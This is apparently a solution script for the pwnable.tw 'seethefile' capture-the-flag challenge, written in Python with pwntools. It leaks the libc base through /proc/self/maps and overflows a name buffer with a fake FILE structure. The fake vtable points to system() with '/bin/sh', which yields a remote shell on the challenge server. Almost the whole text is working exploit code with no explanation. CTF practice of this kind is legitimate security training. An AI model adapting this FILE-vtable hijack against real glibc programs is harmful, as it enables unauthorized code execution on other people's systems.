#pwnable.tw
#seethefile

from pwn import *

debug = False

def menu(choice):
	s.recvuntil('Your choice :')
	s.sendline(str(choice))
	if debug:
		pass
		#print('menu', choice)

def openfile(filename):
	menu(1)
	s.recvuntil('What do you want to see :')
	s.sendline(filename)
	if debug:
		print('openfile finished')

def readfile():
	menu(2)
	if debug:
		print('readfile finished')

def writefile():
	menu(3)
	menuline = '---------------MENU---------------'
	re = s.recvuntil(menuline)
	if debug:
		print('writefile finished')
	return re[:-len(menuline)]

def closefile():
	menu(4)
	if debug:
		print('closefile finished')

def etc(name, menu_choice=5):
	menu(menu_choice)
	s.recvuntil('Leave your name :')
	s.sendline(name)
	if debug:
		print('etc finished')

def exploit():
	atoi_plt = 0x080485D0
	strstr_got = 0x0804B00C

	# libc leak
	openfile('/proc/self/maps')
	readfile()
	if debug:
		readfile()
	re = writefile()
	start = re.find('[heap]') + 7
	re = re[start : start+8]
	libc_base = int(re, 16)
	log.info('libc_base : '+hex(libc_base))
	if debug:
		system_addr = libc_base + 0x3d200
	else:
		system_addr = libc_base + 0x3a940

	# stack leak
	# readfile()
	# readfile()
	# re = writefile()
	# re_li = re.split('\n')
	# for i in re_li:
	# 	if 'stack' in i:
	# 		re = i[:8]
	# 		break
	# stack_base = int(re, 16)
	# log.info('stack_base : '+hex(stack_base))

	# exploit
	## fake FILE struct
	# esp_main = stack_base + 0x1f000
	# fake_vtable = esp_main + 0xc + 8 - 4 * 17
	# fake_io_struct = esp_main + 0xc + + 4

	name = 0x0804B260
	fake_io_addr = name + 0x20 + 4

	#fake_struct = p32(0xffffffff)					# fake _io_struct
	fake_struct = '/bin/sh\x00'
	fake_struct += '\x00' * (0x48 - len(fake_struct))
	fake_struct += p32(name)			# fake _io_struct, (pointer to null)
	fake_struct += '\x00' * (0x94 - len(fake_struct))
	fake_struct += p32(fake_io_addr + len(fake_struct) + 4)

	fake_vtable = p32(0) * 2
	fake_vtable += p32(system_addr)				# fake vtable, fake _io_finish()
	fake_vtable += p32(0) * 14
	fake_vtable += p32(system_addr)				# fake vtable, fake _io_close()

	payload = '\x00' * 0x20
	payload += p32(fake_io_addr)
	payload += fake_struct
	payload += fake_vtable

	etc(payload)

if __name__ == '__main__':

	if debug:
		s = process("./seethefile")
		#s = process(['./seethefile'], env={'LD_PRELOAD':'./libc_32.so.6'})
		pause()
	else:
	    s = remote('chall.pwnable.tw', 10200)

	exploit()
	s.interactive()
	s.close()
